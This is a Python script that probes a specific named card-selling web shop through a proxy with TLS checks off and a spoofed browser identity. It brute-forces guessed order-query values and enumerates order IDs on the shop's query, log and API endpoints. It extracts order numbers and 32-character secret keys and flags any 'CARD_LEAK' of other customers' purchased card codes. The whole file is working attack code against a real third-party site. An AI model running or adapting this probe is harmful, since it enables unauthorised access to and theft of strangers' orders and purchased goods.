#!/usr/bin/env python3
"""Quick probe youhui1998.top/shop/ — rainbow faka surface."""
import json
import os
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://youhui1998.top/shop/"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/youhui1998_probe.json"
PROXY = os.environ.get("PROXY_URL", "")
if not PROXY and os.path.isfile("/data/config/proxy.env"):
    for line in open("/data/config/proxy.env"):
        if line.startswith("PROXY_URL="):
            PROXY = line.strip().split("=", 1)[1].strip().strip('"').strip("'")

SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
FAKA = re.compile(r"mod=faka&id=(\d+)&skey=([a-f0-9]{32})")


def main():
    s = requests.Session()
    s.verify = False
    if PROXY:
        s.proxies = {"http": PROXY, "https": PROXY}
    s.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120",
            "Referer": BASE,
        }
    )

    report = {"target": "youhui1998.top", "proxy": PROXY[:50] if PROXY else None}

    r = s.get(BASE, timeout=30)
    report["home_len"] = len(r.text)
    gc = s.get(BASE + "ajax.php?act=getcount", timeout=20)
    report["getcount"] = gc.text[:300]
    orders = int(json.loads(gc.text).get("orders", 0))
    report["orders"] = orders

    query_hits = []
    probes = [
        "1", "12", "123", "888", "000", "2025", "2026", "202608", "20260802",
        "138", "13", "COM", "sms", "http", "qq", "bot", "youhui", "1998",
        str(orders), str(orders - 1), str(orders - 100),
        "5201314", "123456", "888888", "666666",
    ]
    for q in probes:
        try:
            rq = s.get(BASE, params={"mod": "query", "data": q}, timeout=22)
            so = SHOW.findall(rq.text)
            fk = FAKA.findall(rq.text)
            if so or fk:
                query_hits.append(
                    {"data": q, "shows": so[:10], "faka": fk[:5], "len": len(rq.text)}
                )
                print(f"QUERY HIT {q} shows={len(so)} faka={len(fk)}", flush=True)
        except Exception as e:
            print(f"query err {q}: {e}", flush=True)
        time.sleep(0.25)

    report["query_hits"] = query_hits

    tl = s.get(BASE + "toollogs.php", timeout=20)
    report["toollogs"] = {
        "len": len(tl.text),
        "shows": SHOW.findall(tl.text)[:10],
    }

    api_hits = []
    for oid in [orders, orders - 1, orders - 10, 1, 100, 1000, 5000]:
        try:
            ar = s.get(BASE + f"api.php?act=search&id={oid}", timeout=22)
            body = ar.text[:500]
            if '"code":0' in body or SHOW.search(body) or FAKA.search(body):
                api_hits.append({"id": oid, "body": body})
                print(f"API HIT {oid}", body[:80], flush=True)
        except Exception as e:
            api_hits.append({"id": oid, "err": str(e)[:80]})
        time.sleep(2)

    report["api_hits"] = api_hits
    report["CARD_LEAK"] = bool(query_hits or api_hits)

    with open(OUT, "w", encoding="utf-8") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    print("DONE", json.dumps(report, ensure_ascii=False)[:2000], flush=True)


if __name__ == "__main__":
    main()
